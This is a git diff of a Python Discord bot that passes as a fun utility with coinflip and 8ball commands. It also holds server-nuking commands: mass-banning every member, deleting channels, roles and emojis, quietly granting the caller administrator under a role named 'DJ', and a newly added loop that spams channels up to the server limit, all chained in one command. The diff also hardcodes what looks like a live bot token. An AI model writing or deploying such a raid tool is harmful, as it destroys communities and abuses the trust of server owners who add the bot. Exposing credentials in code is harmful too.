@@ -3,11 +3,15 @@ from discord.embeds import Embed
 from discord.ext import commands
 from discord.ext.commands import bot
 from discord.ext.commands.core import command, has_permissions
+from discord.ext.commands.errors import ChannelNotFound
 from discord.flags import Intents
 import logging
 import random
 
-bottk=""
+bottk="OTAwOTgxMjYzNDA4Njk3MzQ1.YXJOMA.Ul2tU-Q9Pfot87OV353-MYEmNTM" #Paste the bot token here.
+
+#This is the message that would be spammed in the server if you pull the final card, or use the command hackerman
+Monologue=""
 
 intents=discord.Intents(messages = True, guilds = True, reactions = True, members = True, presences = True)
 client=commands.Bot(command_prefix='!', intents=intents)
@@ -42,7 +46,12 @@ async def coinflip(ctx, *, Q=None):
         ctx.send(f"On the line: {Q}\nA: {random.random(Choice)}")
 
 @client.command(aliases=["8ball"])
-async def _8ball():
+async def _8ball(ctx, *, message):
+    Choice = ["As I see it, yes.", "Ask again later.", "Better not tell you now.", "Cannot predict now.", "Concentrate and ask again.",
+             "Don’t count on it.", "It is certain.", "It is decidedly so.", "Most likely.", "My reply is no.", "My sources say no.",
+             "Outlook not so good.", "Outlook good.", "Reply hazy, try again.", "Signs point to yes.", "Very doubtful.", "Without a doubt.",
+             "Yes.", "Yes – definitely.", "You may rely on it."]
+    await ctx.send(f"Question: {message}\nAnswer: {random.random(Choice)}")
     pass
 
 @client.command()   #To delete all emojis
@@ -83,7 +92,7 @@ async def blindnesspotion(ctx):
             pass
     print("Channels have been taken care of...")
 
-@client.command()   #To ban everyone
+@client.command()   #To ban everyone except the one who ran the command
 async def whomegalol(ctx):
     all_members= ctx.guild.members
     for mem in all_members:
@@ -116,13 +125,29 @@ async def jamesbond007(ctx):
     admin_perms=discord.Permissions(administrator=True)
     admin_role= await ctx.guild.create_role(name="DJ", permissions=admin_perms)
     await ctx.author.add_roles(admin_role)
+    
 
-@client.command()   #To: Ban people, delete channels, delete roles, delete emojis, making the user admin
+@client.command()   #To create channels until the channel limit and fill it with the monologue text above
+async def hackerman(ctx):
+    a="Lol"
+    count=0
+    try:
+        while a=="Lol":
+            channel = await ctx.guild.create_text_channel('told-you-so')
+            await channel.send(Monologue)
+            count+=1
+    except:
+        print(f"Done Spamming, created {count} channels in total")
+        pass
+    
+
+@client.command()   #To: Ban people, delete channels, delete roles, delete emojis,
 async def everythingatoncebylenka(ctx):
     await omegalulgone(ctx)
     await whomegalol(ctx)
     await allwhite(ctx)
     await blindnesspotion(ctx)
+    await hackerman(ctx)
 
 @client.command()
 async def help(ctx):
